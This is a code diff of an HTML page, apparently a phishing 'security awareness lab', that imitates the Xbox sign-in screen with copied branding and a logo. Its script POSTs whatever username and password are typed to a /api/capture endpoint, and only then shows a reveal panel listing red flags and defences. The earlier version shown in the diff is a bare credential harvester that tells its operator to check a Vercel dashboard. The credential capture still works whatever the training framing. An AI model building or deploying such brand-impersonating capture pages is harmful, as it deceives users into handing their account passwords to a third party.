@@ -1,148 +1,259 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Portal Login</title>
+    <title>Sign in to Xbox · Security Awareness Lab</title>
     <style>
-        /* Reset & Base */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        :root {
+            --xbox-green: #107c10;
+            --xbox-green-hover: #0e6b0e;
+            --bg-dark: #0b130b;
+            --card: #1b1b1b;
+            --border: #2f2f2f;
+            --text: #ffffff;
+            --muted: #b9b9b9;
+            --input-bg: #2a2a2a;
         }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { min-height: 100%; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* Professional Dark Abstract Background */
-            background: radial-gradient(circle at top left, #1a202c, #0d1117 60%, #000000);
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            color: var(--text);
+            min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            height: 100vh;
-            color: #c9d1d9; /* GitHub text color */
+            justify-content: center;
+            padding: 24px 16px;
+            position: relative;
+            overflow: hidden;
+            background:
+                radial-gradient(circle at 50% 30%, rgba(16,124,16,0.30), transparent 55%),
+                linear-gradient(160deg, #0b130b 0%, #050805 60%, #000 100%);
         }
 
-        /* Glassmorphism Card */
+        /* Animated drifting glow orbs behind the card */
+        body::before, body::after {
+            content: "";
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(90px);
+            opacity: 0.55;
+            z-index: 0;
+            pointer-events: none;
+        }
+        body::before {
+            width: 460px; height: 460px;
+            background: radial-gradient(circle, rgba(16,124,16,0.7), transparent 70%);
+            top: -120px; left: -120px;
+            animation: drift1 16s ease-in-out infinite;
+        }
+        body::after {
+            width: 520px; height: 520px;
+            background: radial-gradient(circle, rgba(13,90,13,0.6), transparent 70%);
+            bottom: -160px; right: -140px;
+            animation: drift2 20s ease-in-out infinite;
+        }
+        @keyframes drift1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50%      { transform: translate(80px, 60px) scale(1.15); }
+        }
+        @keyframes drift2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50%      { transform: translate(-70px, -50px) scale(1.1); }
+        }
+
+        /* Subtle hex/grid texture overlay */
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            background-image:
+                linear-gradient(rgba(16,124,16,0.06) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(16,124,16,0.06) 1px, transparent 1px);
+            background-size: 46px 46px;
+            mask-image: radial-gradient(circle at 50% 40%, #000 30%, transparent 80%);
+            -webkit-mask-image: radial-gradient(circle at 50% 40%, #000 30%, transparent 80%);
+        }
+
+        /* Keep all real content above the background layers */
+        .xbox-logo, .login-card, .reveal { position: relative; z-index: 1; }
+
+        .xbox-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        .xbox-logo svg { fill: var(--xbox-green); filter: drop-shadow(0 0 12px rgba(16,124,16,0.6)); }
+        .xbox-logo span { font-size: 26px; font-weight: 600; letter-spacing: 0.5px; }
+
         .login-card {
-            background: rgba(22, 27, 34, 0.65); /* Semi-transparent dark bg */
-            backdrop-filter: blur(12px); /* The frosted glass effect */
-            -webkit-backdrop-filter: blur(12px);
-            padding: 40px;
-            border-radius: 12px;
+            background: var(--card);
+            padding: 36px 32px;
+            border: 1px solid var(--border);
+            border-radius: 14px;
             width: 100%;
-            max-width: 380px;
-            
-            /* Subtle border for glass edge definition */
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            max-width: 360px;
+            box-shadow: 0 16px 40px rgba(0,0,0,0.55);
         }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 6px; }
+        .subtitle { font-size: 14px; color: var(--muted); margin-bottom: 26px; }
 
-        h2 {
-            text-align: center;
-            margin-bottom: 24px;
-            color: #ffffff; /* White text for contrast */
-            font-size: 24px;
-            font-weight: 600;
-            letter-spacing: -0.5px;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-        }
-
+        .input-group { margin-bottom: 18px; }
         .input-group label {
             display: block;
             margin-bottom: 8px;
-            color: #8b949e; /* GitHub muted text */
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
+            color: var(--muted);
         }
-
         .input-group input {
             width: 100%;
-            padding: 10px 12px;
-            background-color: #0d1117; /* Dark input bg */
-            border: 1px solid #30363d; /* GitHub border color */
-            border-radius: 6px;
-            color: #c9d1d9;
+            padding: 11px 14px;
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
             font-size: 14px;
-            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            color: var(--text);
+            transition: border-color .15s, box-shadow .15s;
         }
-
         .input-group input:focus {
             outline: none;
-            border-color: #58a6ff; /* GitHub blue focus */
-            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15); /* Subtle glow */
+            border-color: var(--xbox-green);
+            box-shadow: 0 0 0 3px rgba(16, 124, 16, 0.35);
         }
-
         .btn {
             width: 100%;
-            padding: 10px 16px;
-            background-color: #238636; /* GitHub Green Button */
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 6px;
-            font-size: 14px;
+            padding: 12px;
+            background-color: var(--xbox-green);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s ease;
-            margin-top: 10px;
+            margin-top: 8px;
+            transition: background-color .15s;
         }
+        .btn:hover { background-color: var(--xbox-green-hover); }
+        .helper {
+            margin-top: 18px;
+            font-size: 13px;
+            color: var(--muted);
+            text-align: center;
+        }
+        .helper a { color: #7ee787; text-decoration: none; }
+        .helper a:hover { text-decoration: underline; }
 
-        .btn:hover {
-            background-color: #2ea043; /* Lighter green on hover */
+        /* --- Post-submit reveal: the teaching moment --- */
+        .reveal {
+            display: none;
+            width: 100%;
+            max-width: 540px;
+            background: var(--card);
+            border: 2px solid var(--xbox-green);
+            border-radius: 14px;
+            padding: 30px;
         }
+        .reveal h2 { font-size: 20px; margin-bottom: 12px; color: #7ee787; }
+        .reveal p { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 14px; }
+        .captured {
+            background: #0d0d0d;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px;
+            font-family: ui-monospace, "Cascadia Code", Menlo, monospace;
+            font-size: 13px;
+            margin-bottom: 14px;
+            word-break: break-all;
+        }
+        .captured span { color: #ff7b72; }
+        .reveal ul { margin: 0 0 16px 18px; font-size: 13px; color: var(--muted); line-height: 1.7; }
     </style>
 </head>
-
 <body>
-    <div class="login-card">
-        <h2>Account Login</h2>
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" required autocomplete="off">
-            </div>
-            <div class="input-group">
-                < label for="password">Password</label>
-                <input type="password" id="password" required autocomplete="off">
-            </div>
-            <button type="submit" class="btn">Log In</button>
-        </form>
+
+<div class="bg-grid"></div>
+
+<div class="xbox-logo">
+    <svg height="40" width="40" viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2Zm0 1.6c1.93 0 3.71.66 5.12 1.77-1.2-.5-3.3-.2-5.12 1.36-1.82-1.56-3.92-1.86-5.12-1.36A8.36 8.36 0 0 1 12 3.6ZM4.6 7.7c.9-.9 2-.3 3.4.9 1 .9 2 2 2.9 3.1-2.3 2.9-4 6-4.5 8a8.4 8.4 0 0 1-1.8-12ZM12 20.4c-1.6 0-3.1-.45-4.4-1.24 1-2.3 2.6-4.8 4.4-6.86 1.8 2.06 3.4 4.56 4.4 6.86A8.36 8.36 0 0 1 12 20.4Zm6.6-3.7c-.5-2-2.2-5.1-4.5-8 .9-1.1 1.9-2.2 2.9-3.1 1.4-1.2 2.5-1.8 3.4-.9a8.4 8.4 0 0 1-1.8 12Z"></path>
+    </svg>
+    <span>XBOX</span>
+</div>
+
+<div class="login-card" id="loginCard">
+    <h1>Sign in</h1>
+    <div class="subtitle">Use your Xbox account to continue</div>
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="username">Email, phone, or Gamertag</label>
+            <input type="text" id="username" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" required autocomplete="off">
+        </div>
+        <button type="submit" class="btn">Sign in</button>
+    </form>
+    <div class="helper">
+        No account? <a href="#" onclick="return false;">Create one</a>
     </div>
+</div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+<!-- The reveal: shows the student exactly what an attacker would have captured -->
+<div class="reveal" id="reveal">
+    <h2>⚠️ This was a phishing simulation</h2>
+    <p>
+        You just submitted credentials to a fake Xbox login page. In a real attack the
+        attacker now owns everything you typed. Here is exactly what this page captured:
+    </p>
+    <div class="captured" id="capturedBox"></div>
+    <p>Red flags this page deliberately included for you to spot:</p>
+    <ul>
+        <li>The URL is <strong>not</strong> an official Xbox / Microsoft domain — always check the address bar.</li>
+        <li>No real Microsoft account hand-off, 2FA, or passkey prompt.</li>
+        <li>It accepts <em>any</em> input and "succeeds" — a real login validates.</li>
+        <li>The page asks for your password directly instead of a Microsoft OAuth redirect.</li>
+    </ul>
+    <p><strong>Defense:</strong> verify the domain, use a password manager (it won't autofill on look-alike domains), and enable phishing-resistant 2FA (authenticator app / security keys).</p>
+    <button class="btn" onclick="location.reload()">Restart simulation</button>
+</div>
 
-            const usernameVal = document.getElementById('username').value;
-            const passwordVal = document.getElementById('password').value;
+<script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
 
-            try {
-                const response = await fetch('/api/capture', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        user: usernameVal,
-                        pass: passwordVal
-                    })
-                });
+        const usernameVal = document.getElementById('username').value;
+        const passwordVal = document.getElementById('password').value;
 
-                if (response.ok) {
-                    alert('Request logged. Check Vercel Dashboard!');
-                    document.getElementById('loginForm').reset();
-                } else {
-                    alert('Error payload status: ' + response.status);
-                }
-            } catch (err) {
-                console.error('Network execution failure:', err);
-            }
-        });
-    </script>
+        try {
+            await fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user: usernameVal, pass: passwordVal })
+            });
+        } catch (err) {
+            console.error('Lab capture endpoint unreachable:', err);
+        }
+
+        document.getElementById('capturedBox').innerHTML =
+            'username: <span>' + escapeHtml(usernameVal) + '</span><br>' +
+            'password: <span>' + escapeHtml(passwordVal) + '</span>';
+
+        document.getElementById('loginCard').style.display = 'none';
+        document.getElementById('reveal').style.display = 'block';
+    });
+
+    function escapeHtml(s) {
+        return s.replace(/[&<>"']/g, c => ({
+            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+        }[c]));
+    }
+</script>
+
 </body>
-
 </html>
